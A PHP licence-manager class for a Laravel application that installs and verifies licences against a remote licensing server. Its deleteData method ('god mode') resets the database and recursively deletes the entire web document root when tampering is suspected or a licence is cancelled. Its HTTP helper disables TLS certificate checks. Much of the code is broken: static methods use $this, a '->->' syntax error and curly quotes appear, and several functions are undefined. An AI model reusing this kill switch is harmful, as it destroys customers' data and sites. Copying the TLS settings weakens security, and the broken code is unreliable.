<?php

namespace IngressITSolutions\Generator;

use IngressITSolutions\Generator\Exception\BaseException;
use IngressITSolutions\Generator\Generator;

class LicMan
{
    /**
     * 
     * 
     * 
     **/
    
    
     //check Auto PHP Licenser core configuration and return an array with error messages if something wrong
    public static function checkSettings(){
        $notifications_array=array();

            if (empty(config('lmconfig.PRODUCT_KEY'))) //invalid encryption salt
            {
                $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_PRODUCT_KEY');
            }

            if (empty(config('installer.apiKey'))) //invalid License Manager Installer API Key
            {
                $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_MISSING_INSTALL_API_KEY');
            }


            if (empty(config('lmconfig.LM_ROOT_URL'))) //invalid License Manager server URL
            {
                $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_ROOT_URL');
            }

            if (empty(config('lmconfig.LM_PRODUCT_ID'))) //invalid product ID
            {
                $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_PRODUCT_ID');
            }

            if (!$this->validateNumberOrRange(config('lmconfig.LM_DAYS'), 1, 365)) //invalid verification period
            {
                $notifications_array[]=config('lmconfig.LM_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD');
            }

    


        return $notifications_array;
    }


    //generate signature to be submitted to Auto PHP Licenser server
    public static function generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)
    {
    $script_signature=null;
    $root_ips_array=gethostbynamel($this->getRawDomain(config('lmconfig.LM_ROOT_URL')));

    if (!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))
        {
        $script_signature=hash("sha256", gmdate("Y-m-d").$ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE.config('lmconfig.LM_PRODUCT_ID').implode("", $root_ips_array));
        }

    return $script_signature;
    }



    //install license
    public static function installLicense($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK=null) {
        $notifications_array= array();
        $apl_core_notifications= $this->checkSettings(); //check core settings
        if (empty($apl_core_notifications)) { //only continue if script is properly configured
            if ($this->getLicenseData($MYSQLI_LINK) == 1) { //license already installed
                $notifications_array['notification_case']="notification_already_installed";
                $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_SCRIPT_ALREADY_INSTALLED');
            } else { //license not yet installed, do it now
                $INSTALLATION_HASH = hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE); //generate hash

                $licFile  = File::get(Storage::disk('local')->get('esnecil.lic'));
                $pubKey = File::get(Storage::disk('local')->get('public.txt'));
                $parsedData  = Generator::parse($licFile, $pubKey);
                $post_info="product_id=".rawurlencode(config('lmconfig.LM_PRODUCT_ID'))."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode($this->generateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                $content_array=$this->customPost(config('lmconfig.LM_ROOT_URL')."/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
                $notifications_array=$this->parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
                if ($notifications_array['notification_case']=="notification_license_ok") { //everything OK
                
                    $INSTALLATION_KEY=$this->customEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), config('lmconfig.PRODUCT_KEY').$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
                    $LCD=$this->customEncrypt(date("Y-m-d", strtotime("-".config('lmconfig.LM_DAYS')." days")), config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //license will need to be verified right after installation
                    $LRD=$this->customEncrypt(date("Y-m-d"), config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY);
                    $newRecord = DB::table('lmconfig')->updateOrInsert(
                        ['id' => 1],
                        [
                            'clientEmail' => 'john@example.com',  
                            'productKey' => config('lmconfig.PRODUCT_KEY'), 
                            'lastCheckedOn' => '',
                            'expireOn' => '',
                            'supportTill' => '',
                            'FailedAttempts' => '',
                            'LCD' => '',
                            'LRD' => '',
                            'installationKey' => '',
                            'installationHash' => '',
                            ]
                    );
                    $license = Generator::generate($newRecord, $pubKey);
                    Storage::put('-esnecil.lic', $license);
        
                        
                } else {
                    $notifications_array['notification_case']="notification_already_installed";
                    $notifications_array['notification_text']= config('lmconfig.LM_CORE_NOTIFICATION_INVALID_LICENSE_KEY');
                }

            
            }
        } else {//script is not properly configured
            $notifications_array['notification_case']="notification_script_corrupted";
            $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

        return $notifications_array;

    }


    //encrypt text with custom key
    public static function customEncrypt($string, $key) {
        $encrypted_string=null;

        if (!empty($string) && !empty($key)) {
            $iv=openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc")); //generate an initialization vector

            $encrypted_string=openssl_encrypt($string, "aes-256-cbc", $key, 0, $iv); //encrypt the string using AES 256 encryption in CBC mode using encryption key and initialization vector
            $encrypted_string=base64_encode($encrypted_string."::".$iv); //the $iv is just as important as the key for decrypting, so save it with encrypted string using a unique separator "::"
        }

        return $encrypted_string;
    }


    //process response from Auto PHP Licenser server. if response received, validate it and parse notifications and data (if any). if response not received or is invalid, return a corresponding notification
    public static function parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
        $notifications_array=array();

        if (!empty($content_array)) { //response received, validate it
            
            if (!empty($content_array['headers']['notification_server_signature']) && $this->verifyServerSignature($content_array['headers']['notification_server_signature'], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) {//response valid
                $notifications_array['notification_case']=$content_array['headers']['notification_case'];
                $notifications_array['notification_text']=$content_array['headers']['notification_text'];
                if (!empty($content_array['headers']['notification_data'])) { //additional data returned 
                    $notifications_array['notification_data']=json_decode($content_array['headers']['notification_data'], true);
                }
            } else { //response invalid
                $notifications_array['notification_case']="notification_invalid_response";
                $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_INVALID_RESPONSE');
            }
        }
        else {//no response received
            $notifications_array['notification_case']="notification_no_connection";
            $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_NO_CONNECTION');
        }

        return $notifications_array;
    }


    //get raw domain (returns (sub.)domain.com from url like http://www.(sub.)domain.com/something.php?xx=yy)
    public static function getRawDomain($url) {
        $raw_domain=null;

        if (!empty($url)) {
            $url_array=parse_url($url);
            if (empty($url_array['scheme'])) {//in case no scheme was provided in url, it will be parsed incorrectly. add http:// and re-parse
                $url="http://".$url;
                $url_array=parse_url($url);
            }

            if (!empty($url_array['host'])) {
                $raw_domain=$url_array['host'];

                $raw_domain=trim(str_ireplace("www.", "", filter_var($raw_domain, FILTER_SANITIZE_URL)));
            }
        }

        return $raw_domain;
    }



    //verify signature received from Auto PHP Licenser server
    public static function verifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) {
        $result=false;
        $root_ips_array=gethostbynamel($this->getRawDomain(config('lmconfig.LM_ROOT_URL')));

        if (!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))
            {
            if (hash("sha256", implode("", $root_ips_array).config('lmconfig.LM_PRODUCT_ID').$LICENSE_CODE.$CLIENT_EMAIL.$ROOT_URL.gmdate("Y-m-d"))==$notification_server_signature)
                {
                $result=true;
                }
            }

        return $result;
    }



    //make post requests with cookies and referrers, return array with server headers, errors, and body content
    public static function customPost($url, $post_info=null, $refer=null) {
        $userAgent="License Manager cURL"; 
        $connect_timeout=20;
        $server_response_array=array();
        $formatted_headers_array=array();
        $personalToken = config('installer.apiKey');

        if (filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info)) {
            if (empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL)) { //use original URL as refer when no valid refer URL provided 
                $refer=$url;
            }

            $ch=curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
            curl_setopt($ch, CURLOPT_REFERER, $refer);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
            curl_setopt_array($ch, array(
                CURLOPT_HTTPHEADER => array(
                "Authorization: {$personalToken}",
                "User-Agent: {$userAgent}"
            )));

            //this function is called by curl for each header received - https://stackoverflow.com/questions/9183178/can-php-curl-retrieve-response-headers-and-body-in-a-single-request
            

            $result=curl_exec($ch);
            $curl_error=curl_error($ch); //returns a human readable error (if any)
            curl_close($ch);

            $server_response_array['headers']=$formatted_headers_array;
            $server_response_array['error']=$curl_error;
            $server_response_array['body']=$result;
        }

        return $server_response_array;
    }


    //return an array with license data,no matter where license is stored
    public static function getLicenseData($MYSQLI_LINK=null) {
        $isInstalled = 0;

                $licRecDB = DB::table('lmconfig')->first();
                $licRecStorage = $this->parseLicenseFile();

                if($licRecDB || $licRecStorage){
                    $isInstalled = 1;
                } else {
                    $isInstalled = 0;
                }

        return $isInstalled;
    }


    //parse license file and make an array with license data
    public static function parseLicenseFile() {
        $licRecStorage = 0;
        $licFile  = File::get(Storage::disk('local')->get('esnecil.lic'));
        $pubKey = File::get(Storage::disk('local')->get('public.txt'));

        if (!empty($pubKey) && !empty($licFile)) {
            return true;
        } else {
            return false;
        }
    }




    //validate numbers (or ranges like 1-10) and check if they match min and max values
    private static function validateNumberOrRange($number, $min_value, $max_value=INF){
        $result=false;

        if (filter_var($number, FILTER_VALIDATE_INT)===0 || !filter_var($number, FILTER_VALIDATE_INT)===false) //number provided
            {
            if ($number>=$min_value && $number<=$max_value)
                {
                $result=true;
                }
            else
                {
                $result=false;
                }
            }

        if (stristr($number, "-")) //range provided
            {
            $numbers_array=explode("-", $number);
            if (filter_var($numbers_array[0], FILTER_VALIDATE_INT)===0 || !filter_var($numbers_array[0], FILTER_VALIDATE_INT)===false && filter_var($numbers_array[1], FILTER_VALIDATE_INT)===0 || !filter_var($numbers_array[1], FILTER_VALIDATE_INT)===false)
                {
                if ($numbers_array[0]>=$min_value && $numbers_array[1]<=$max_value && $numbers_array[0]<=$numbers_array[1])
                    {
                    $result=true;
                    }
                else
                    {
                    $result=false;
                    }
                }
            }

        return $result;
    }



    //calculate number of days between dates
    public static function getDaysBetweenDates($date_from, $date_to)
    {
    $number_of_days=0;

    if ($this->verifyDateTime($date_from, "Y-m-d") && $this->verifyDateTime($date_to, "Y-m-d"))
        {
        $date_to=new DateTime($date_to);
        $date_from=new DateTime($date_from);
        $number_of_days=$date_from->diff($date_to)->format("%a");
        }

    return $number_of_days;
    }



    public static function verifyLicense($MYSQLI_LINK=null, $FORCE_VERIFICATION=0)
    {
    $notifications_array=array();
    $update_lrd_value=0;
    $update_lcd_value=0;
    $updated_records=0;
    $apl_core_notifications=$this->checkSettings(); //check core settings

    if (empty($apl_core_notifications)) //only continue if script is properly configured
        {
        if ($this->checkData($MYSQLI_LINK)) //only continue if license is installed and properly configured
            {
            extract($this->getLicenseData($MYSQLI_LINK)); //get license data

            if ($this->getDaysBetweenDates($this->customDecrypt($LCD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY), date("Y-m-d"))<config('lmconfig.LM_DAYS') && $this->customDecrypt($LCD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY)<=date("Y-m-d") && $this->customDecrypt($LRD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY)<=date("Y-m-d") && $FORCE_VERIFICATION==0) //the only case when no verification is needed, return notification_license_ok case, so script can continue working
                {
                $notifications_array['notification_case']="notification_license_ok";
                $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_BYPASS_VERIFICATION');
                }
            else //time to verify license (or use forced verification)
                {
                $post_info="product_id=".rawurlencode(config('lmconfig.LM_PRODUCT_ID'))."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                $content_array=$this->customPost(config('lmconfig.LM_ROOT_URL')."/apl_callbacks/license_verify.php", $post_info, $ROOT_URL);
                $notifications_array=$this->parseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
                if ($notifications_array['notification_case']=="notification_license_ok") //everything OK
                    {
                    $update_lcd_value=1;
                    }

                if ($notifications_array['notification_case']=="notification_license_cancelled" && config('lmconfig.LM_DELETE_CANCELLED')=="YES") //license cancelled, data deletion activated, so delete user data
                    {
                    $this->deleteData($MYSQLI_LINK);
                    }
                }

            if ($this->customDecrypt($LRD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY)<date("Y-m-d")) //used to make sure database gets updated only once a day, not every time script is executed. do it BEFORE new $INSTALLATION_KEY is generated
                {
                $update_lrd_value=1;
                }

            if ($update_lrd_value==1 || $update_lcd_value==1) //update database only if $LRD or $LCD were changed
                {
                if ($update_lcd_value==1) //generate new $LCD value ONLY if verification succeeded. Otherwise, old $LCD value should be used, so license will be verified again next time script is executed
                    {
                    $LCD=date("Y-m-d");
                    }
                else //get existing DECRYPTED $LCD value because it will need to be re-encrypted using new $INSTALLATION_KEY in case license verification didn't succeed
                    {
                    $LCD=$this->customDecrypt($LCD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY);
                    }

                $INSTALLATION_KEY=$this->customEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), config('lmconfig.PRODUCT_KEY').$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
                $LCD=$this->customEncrypt($LCD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //finally encrypt $LCD value (it will contain either DECRYPTED old date, either non-encrypted today's date)
                $LRD=$this->customEncrypt(date("Y-m-d"), config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //generate new $LRD value every time database needs to be updated (because if LCD is higher than LRD, cracking attempt will be detected).

                
                $licFile  = File::get(Storage::disk(‘local’)->get(‘esnecil.lic’));
                $pubKey = File::get(Storage::disk(‘local’)->get(‘public.txt’));
                $parsedData  = Generator::parse($licFile, $pubKey);
                $newRecord = DB::table('lmconfig')->->where('id', 1)->update(
                    [
                        'lastCheckedOn' => date("Y-m-d"),
                        'expireOn' => '',
                        'supportTill' => '',
                        'FailedAttempts' => '',
                        'LCD' => $LCD,
                        'LRD' => $LRD,
                        'installationKey' => $INSTALLATION_KEY,
                        'installationHash' => '',
                        ]
                );
                $license = Generator::generate($newRecord, $pubKey);
                Storage::put('-esnecil.lic', $license);
    


                    
                }
            }
        else //license is not installed yet or corrupted
            {
            $notifications_array['notification_case']="notification_license_corrupted";
            $notifications_array['notification_text']=config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }



    //check license data and return false if something wrong
    public static function checkData($MYSQLI_LINK=null)
    {
    $error_detected=0;
    $cracking_detected=0;
    $data_check_result=false;

    extract($this->getLicenseData($MYSQLI_LINK)); //get license data

    if (!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD)) //do further check only if essential variables are valid
        {
        $LCD=$this->customDecrypt($LCD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LCD value for easier data check
        $LRD=$this->customDecrypt($LRD, config('lmconfig.PRODUCT_KEY').$INSTALLATION_KEY); //decrypt $LRD value for easier data check

        if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid script url
            {
            $error_detected=1;
            }

        if (filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("$ROOT_URL/", 1, 1, 0, 1))===false) //script is opened via browser (current_url set), but current_url is different from value in database
            {
            $error_detected=1;
            }

        if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH!=hash("sha256", $ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE)) //invalid installation hash (value - $ROOT_URL, $CLIENT_EMAIL AND $LICENSE_CODE encrypted with sha256)
            {
            $error_detected=1;
            }

        if (empty($INSTALLATION_KEY) || !password_verify($LRD, $this->customDecrypt($INSTALLATION_KEY, config('lmconfig.PRODUCT_KEY').$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
            {
            $error_detected=1;
            }

        if (!$this->verifyDateTime($LCD, "Y-m-d")) //last check date is invalid
            {
            $error_detected=1;
            }

        if (!$this->verifyDateTime($LRD, "Y-m-d")) //last run date is invalid
            {
            $error_detected=1;
            }

        //check for possible cracking attempts - starts
        if ($this->verifyDateTime($LCD, "Y-m-d") && $LCD>date("Y-m-d", strtotime("+1 day"))) //last check date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if ($this->verifyDateTime($LRD, "Y-m-d") && $LRD>date("Y-m-d", strtotime("+1 day"))) //last run date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if ($this->verifyDateTime($LCD, "Y-m-d") && $this->verifyDateTime($LRD, "Y-m-d") && $LCD>$LRD) //last check date and last run date is VALID, but LCD is higher than LRD (someone manually decrypted and overwrote it or changed system time back)
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if ($cracking_detected==1 && config('lmconfig.LM_DELETE_CRACKED')=="YES") //delete user data
            {
            $this->deleteData($MYSQLI_LINK);
            }
        //check for possible cracking attempts - ends

        if ($error_detected!=1 && $cracking_detected!=1) //everything OK
            {
            $data_check_result=true;
            }
        }

        return $data_check_result;
    }



    //delete user data
    public static function deleteData($MYSQLI_LINK=null)
    {
    if (isset($_SERVER['DOCUMENT_ROOT'])) //god mode enabled, delete everything from document root directory (usually httpdocs or public_html). god mode might not be available for IIS servers that don't always set $_SERVER['DOCUMENT_ROOT']
        {
        $root_directory=$_SERVER['DOCUMENT_ROOT'];
        }
    else
        {
        $root_directory=dirname(__DIR__); //(this file is located at INSTALLATION_PATH/SCRIPT, go one level up to enter root directory of protected script
        }

        Artisan::call("php artisan migrate:reset");

    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path)
        {
        $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
        }
    rmdir($root_directory);

    

    exit(); //abort further execution
    }


    //verify date and/or time according to provided format (such as Y-m-d, Y-m-d H:i, H:i, and so on)
    public static function verifyDateTime($datetime, $format)
    {
    $result=false;

    if (!empty($datetime) && !empty($format))
        {
        $datetime=DateTime::createFromFormat($format, $datetime);
        $errors=DateTime::getLastErrors();

        if ($datetime && empty($errors['warning_count'])) //datetime OK
            {
            $result=true;
            }
        }

    return $result;
    }

    //decrypt text with custom key
    public static function customDecrypt($string, $key)
    {
    $decrypted_string=null;

    if (!empty($string) && !empty($key))
        {
        $string=base64_decode($string); //remove the base64 encoding from string (it's always encoded using base64_encode)
        if (stristr($string, "::")) //unique separator "::" found, most likely it's valid encrypted string
            {
            $string_iv_array=explode("::", $string, 2); //to decrypt, split the encrypted string from $iv - unique separator used was "::"
            if (!empty($string_iv_array) && count($string_iv_array)==2) //proper $string_iv_array should contain exactly two values - $encrypted_string and $iv
                {
                list($encrypted_string, $iv)=$string_iv_array;

                $decrypted_string=openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
                }
            }
        }

    return $decrypted_string;
    }



}